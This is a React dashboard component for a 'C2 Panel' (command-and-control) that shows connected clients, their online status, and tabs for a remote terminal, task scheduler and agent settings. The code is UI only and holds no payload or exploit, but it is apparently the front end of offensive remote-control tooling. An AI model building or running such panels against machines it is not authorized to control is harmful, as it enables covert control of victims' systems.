import React, { useState, useEffect } from 'react';
import { Agent } from '../types';
import UserTable from '../components/UserTable';
import Terminal from '../components/Terminal';
import TaskScheduler from '../components/TaskScheduler';
import Settings from '../components/Settings';
import AgentSection from '../components/AgentSection';

interface DashboardPageProps {
  tableData: Agent[];
  isLoading: boolean;
  onActionClicked: (agent: Agent) => void;
  onTasksClicked: (agent: Agent) => void;
  onLogout: () => void;
  onSendCommand: (agentId: string, command: string) => void;
}

const DashboardPage: React.FC<DashboardPageProps> = ({ 
  tableData, 
  isLoading, 
  onActionClicked, 
  onTasksClicked, 
  onLogout,
  onSendCommand
}) => {
  const [activeTab, setActiveTab] = useState('overview');

  // Calculate stats from real data
  const onlineAgents = tableData.filter(agent => agent.status === 'online');
  const offlineAgents = tableData.filter(agent => agent.status === 'offline');

  const renderTabContent = () => {
    switch (activeTab) {
      case 'overview':
        return (
          <div className="space-y-6">
            {/* Header */}
            <div className="bg-white dark:bg-boxdark rounded-lg shadow-sm border border-stroke dark:border-strokedark p-6">
              <h1 className="text-2xl font-bold text-black dark:text-white mb-2">
                🎯 Command & Control Dashboard
              </h1>
              <p className="text-bodydark2">
                Monitor and control your connected clients in real-time
              </p>
            </div>

            {/* Stats Overview */}
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
              <div className="bg-white dark:bg-boxdark rounded-lg shadow-sm border border-stroke dark:border-strokedark p-6">
                <div className="flex items-center justify-between">
                  <div>
                    <p className="text-sm font-medium text-bodydark2">Total Clients</p>
                    <p className="text-2xl font-bold text-blue-600">{tableData.length}</p>
                  </div>
                  <div className="p-3 rounded-full bg-blue-100">
                    <span className="text-2xl">🖥️</span>
                  </div>
                </div>
              </div>
              
              <div className="bg-white dark:bg-boxdark rounded-lg shadow-sm border border-stroke dark:border-strokedark p-6">
                <div className="flex items-center justify-between">
                  <div>
                    <p className="text-sm font-medium text-bodydark2">Online Clients</p>
                    <p className="text-2xl font-bold text-green-600">{onlineAgents.length}</p>
                  </div>
                  <div className="p-3 rounded-full bg-green-100">
                    <span className="text-2xl">🟢</span>
                  </div>
                </div>
              </div>
              
              <div className="bg-white dark:bg-boxdark rounded-lg shadow-sm border border-stroke dark:border-strokedark p-6">
                <div className="flex items-center justify-between">
                  <div>
                    <p className="text-sm font-medium text-bodydark2">Offline Clients</p>
                    <p className="text-2xl font-bold text-red-600">{offlineAgents.length}</p>
                  </div>
                  <div className="p-3 rounded-full bg-red-100">
                    <span className="text-2xl">🔴</span>
                  </div>
                </div>
              </div>
              
              <div className="bg-white dark:bg-boxdark rounded-lg shadow-sm border border-stroke dark:border-strokedark p-6">
                <div className="flex items-center justify-between">
                  <div>
                    <p className="text-sm font-medium text-bodydark2">Active Tasks</p>
                    <p className="text-2xl font-bold text-purple-600">0</p>
                  </div>
                  <div className="p-3 rounded-full bg-purple-100">
                    <span className="text-2xl">⚡</span>
                  </div>
                </div>
              </div>
            </div>

            {/* Client Status Chart */}
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              <div className="bg-white dark:bg-boxdark rounded-lg shadow-sm border border-stroke dark:border-strokedark p-6">
                <h3 className="text-lg font-semibold text-black dark:text-white mb-4">
                  Client Status Distribution
                </h3>
                <div className="space-y-4">
                  <div className="flex items-center justify-between">
                    <div className="flex items-center space-x-3">
                      <div className="w-4 h-4 bg-green-500 rounded-full"></div>
                      <span className="text-sm text-bodydark2">Online</span>
                    </div>
                    <span className="text-sm font-medium text-black dark:text-white">
                      {onlineAgents.length}
                    </span>
                  </div>
                  <div className="flex items-center justify-between">
                    <div className="flex items-center space-x-3">
                      <div className="w-4 h-4 bg-red-500 rounded-full"></div>
                      <span className="text-sm text-bodydark2">Offline</span>
                    </div>
                    <span className="text-sm font-medium text-black dark:text-white">
                      {offlineAgents.length}
                    </span>
                  </div>
                  <div className="w-full bg-gray-200 dark:bg-gray-700 rounded-full h-2">
                    <div 
                      className="bg-green-500 h-2 rounded-full transition-all duration-300"
                      style={{ 
                        width: tableData.length > 0 
                          ? `${(onlineAgents.length / tableData.length) * 100}%` 
                          : '0%' 
                      }}
                    ></div>
                  </div>
                </div>
              </div>

              {/* Quick Actions */}
              <div className="bg-white dark:bg-boxdark rounded-lg shadow-sm border border-stroke dark:border-strokedark p-6">
                <h3 className="text-lg font-semibold text-black dark:text-white mb-4">
                  Quick Actions
                </h3>
                <div className="grid grid-cols-2 gap-4">
                  <button 
                    onClick={() => setActiveTab('terminal')}
                    className="p-4 bg-blue-50 dark:bg-blue-900/20 rounded-lg hover:bg-blue-100 dark:hover:bg-blue-900/40 transition-colors"
                  >
                    <div className="text-2xl mb-2">💻</div>
                    <div className="text-sm font-medium text-black dark:text-white">Terminal</div>
                  </button>
                  <button 
                    onClick={() => setActiveTab('tasks')}
                    className="p-4 bg-green-50 dark:bg-green-900/20 rounded-lg hover:bg-green-100 dark:hover:bg-green-900/40 transition-colors"
                  >
                    <div className="text-2xl mb-2">📸</div>
                    <div className="text-sm font-medium text-black dark:text-white">Tasks</div>
                  </button>
                  <button 
                    onClick={() => setActiveTab('clients')}
                    className="p-4 bg-purple-50 dark:bg-purple-900/20 rounded-lg hover:bg-purple-100 dark:hover:bg-purple-900/40 transition-colors"
                  >
                    <div className="text-2xl mb-2">👥</div>
                    <div className="text-sm font-medium text-black dark:text-white">Clients</div>
                  </button>
                  <button 
                    onClick={() => setActiveTab('settings')}
                    className="p-4 bg-orange-50 dark:bg-orange-900/20 rounded-lg hover:bg-orange-100 dark:hover:bg-orange-900/40 transition-colors"
                  >
                    <div className="text-2xl mb-2">⚙️</div>
                    <div className="text-sm font-medium text-black dark:text-white">Settings</div>
                  </button>
                </div>
              </div>
            </div>

            {/* Recent Activity */}
            <div className="bg-white dark:bg-boxdark rounded-lg shadow-sm border border-stroke dark:border-strokedark p-6">
              <h3 className="text-lg font-semibold text-black dark:text-white mb-4">
                Recent Activity
              </h3>
              <div className="space-y-3">
                {onlineAgents.length > 0 ? (
                  <div className="flex items-center space-x-3 p-3 bg-green-50 dark:bg-green-900/20 rounded-lg">
                    <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                    <span className="text-sm text-black dark:text-white">
                      {onlineAgents.length} client(s) connected and ready
                    </span>
                  </div>
                ) : (
                  <div className="flex items-center space-x-3 p-3 bg-gray-50 dark:bg-gray-800 rounded-lg">
                    <div className="w-2 h-2 bg-gray-400 rounded-full"></div>
                    <span className="text-sm text-bodydark2">
                      No clients currently connected
                    </span>
                  </div>
                )}
              </div>
            </div>
          </div>
        );

      case 'clients':
        return (
          <div className="space-y-6">
            <div className="bg-white dark:bg-boxdark rounded-lg shadow-sm border border-stroke dark:border-strokedark p-6">
              <h2 className="text-xl font-semibold text-black dark:text-white mb-4">Connected Clients</h2>
              {isLoading ? (
                <div className="flex justify-center items-center h-64">
                  <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-primary"></div>
                </div>
              ) : (
                <UserTable 
                  users={tableData} 
                  onViewUser={onActionClicked}
                  onViewTasks={onTasksClicked} 
                />
              )}
            </div>
          </div>
        );

      case 'terminal':
        return <Terminal agents={onlineAgents} onSendCommand={onSendCommand} />;
      
      case 'tasks':
        return <TaskScheduler agents={tableData} />;
      
      case 'settings':
        return <Settings />;
      
      case 'agent':
        return <AgentSection />;
      
      default:
        return null;
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-black via-red-950/20 to-black text-white">
      {/* Header */}
      <div className="bg-black/80 backdrop-blur-xl border-b border-red-500/30 sticky top-0 z-50">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex items-center justify-between h-16">
            <div className="flex items-center space-x-4">
              <div className="flex items-center space-x-3">
                <div className="w-8 h-8 bg-gradient-to-r from-red-500 to-red-600 rounded-lg flex items-center justify-center">
                  <span className="text-white font-bold">💀</span>
                </div>
                <div>
                  <h1 className="text-xl font-bold text-white">C2 Panel</h1>
                  <p className="text-xs text-red-400">Command & Control Panel</p>
                </div>
              </div>
            </div>
            
            <div className="flex items-center space-x-4">
              <div className="flex space-x-2">
                <button className="px-4 py-2 bg-red-600 hover:bg-red-700 text-white rounded-lg transition-colors text-sm font-medium">
                  OPERATIONAL
                </button>
                <button 
                  onClick={onLogout}
                  className="px-4 py-2 bg-gray-600 hover:bg-gray-700 text-white rounded-lg transition-colors text-sm font-medium"
                >
                  DISCONNECT
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Navigation Tabs */}
      <div className="bg-black/60 backdrop-blur-xl border-b border-red-500/20 sticky top-16 z-40">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <nav className="flex space-x-8">
            {[
              { id: 'overview', label: 'Overview', icon: '📊' },
              { id: 'clients', label: 'Clients', icon: '👥' },
              { id: 'agent', label: 'Agent', icon: '🤖' },
              { id: 'terminal', label: 'Terminal', icon: '💻' },
              { id: 'tasks', label: 'Tasks', icon: '📋' },
              { id: 'settings', label: 'Settings', icon: '⚙️' }
            ].map((tab) => (
              <button
                key={tab.id}
                onClick={() => setActiveTab(tab.id)}
                className={`py-4 px-1 border-b-2 font-medium text-sm transition-colors ${
                  activeTab === tab.id
                    ? 'border-red-500 text-red-400'
                    : 'border-transparent text-gray-400 hover:text-white hover:border-gray-300'
                }`}
              >
                <span className="mr-2">{tab.icon}</span>
                {tab.label}
              </button>
            ))}
          </nav>
        </div>
      </div>

      {/* Main Content */}
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        {renderTabContent()}
      </div>
    </div>
  );
};

export default DashboardPage;